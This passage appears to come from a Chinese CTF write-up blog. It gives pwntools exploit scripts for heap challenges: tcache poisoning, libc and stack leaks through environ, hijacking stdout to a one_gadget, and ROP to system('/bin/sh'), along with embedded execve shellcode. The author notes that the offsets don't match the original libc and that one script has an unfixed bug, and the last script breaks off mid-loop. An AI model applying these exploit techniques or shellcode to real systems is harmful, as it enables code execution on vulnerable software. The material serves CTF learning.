class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><br><br>one_gadget = [<span class="hljs-number">0xda861</span>, <span class="hljs-number">0xda864</span>, <span class="hljs-number">0xda867</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0</span>)<br>sh.recv()<br>fd = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = fd - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>one_gadget = libc_base + one_gadget[<span class="hljs-number">1</span>]<br>jump = libc_base + <span class="hljs-number">0x1f4560</span><br>jump = jump + <span class="hljs-number">0x60</span><br>stdout = libc_base + <span class="hljs-number">0x1f3760</span><br>lg(<span class="hljs-string">&#x27;jump&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add() <span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ jump<br><br><span class="hljs-comment"># change _IO_doallocbuf</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>payload = <span class="hljs-number">2</span> * p64(one_gadget)<br>edit(<span class="hljs-number">0x10</span>, <span class="hljs-number">15</span>, payload)<br><br><span class="hljs-comment"># flush struct_stdout</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ stdout<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 16</span><br>add() <span class="hljs-comment"># 17</span><br>edit(<span class="hljs-number">0x40</span>, <span class="hljs-number">17</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="堆栈结合-利用environ"><a href="#堆栈结合-利用environ" class="headerlink" title="堆栈结合(利用environ)"></a>堆栈结合(利用environ)</h3><p>利用environ泄露出栈地址，再分配堆块构造rop链。注意glibc2.23之后对分配的堆地址进行了检查，必须是0x10对齐；还有一点就是，题目中的edit函数和add函数的返回地址为同一个地址，所以在分配fake_chunk的时候要注意不能直接将堆块分配在返回地址附近，否则会造成返回地址的清空，程序报错；还有一点，edit的子函数不会对canary进行检查。</p><p>WP如下：</p><blockquote><p>提示：本人用的libc不是比赛给的libc，是glibc-all-in-one里面的2.34-0ubuntu3_amd64，忘记改回来了，所以wp里的偏移不能适用于原题。┭┮﹏┭┮</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0</span>)<br>sh.recv()<br>fd = uu64()<br>libc_base = fd - <span class="hljs-number">0x218cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>environ = libc_base + libc.symbols[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ environ<br><br><span class="hljs-comment"># leak stack</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>show(<span class="hljs-number">15</span>)<br>sh.recv()<br>leak_stack = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br>fake_addr = leak_stack - <span class="hljs-number">0x168</span><br><br><span class="hljs-comment"># make rop</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ fake_addr<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add()<br>add()<br><span class="hljs-comment"># dbg()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)<br>edit(<span class="hljs-number">0x38</span>, <span class="hljs-number">17</span>, payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h2><p>这道题是上一道题的进阶，开启了沙盒禁用了execve，所以我们考虑用orw来解决问题，学习两种方法。</p><h3 id="堆栈结合-利用environ-1"><a href="#堆栈结合-利用environ-1" class="headerlink" title="堆栈结合(利用environ)"></a>堆栈结合(利用environ)</h3><p>注意一个坑，在泄露libc的时候，fd的低位为\x00，无法泄露fd，选择覆盖fd直至bk的低位一个字节，泄露bk。</p><blockquote><p>打比赛的时候踩坑了┭┮﹏┭┮</p><p>脚本里面好像找栈地址的时候发生了错误，还没来得及调试</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> environ<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><span class="hljs-comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 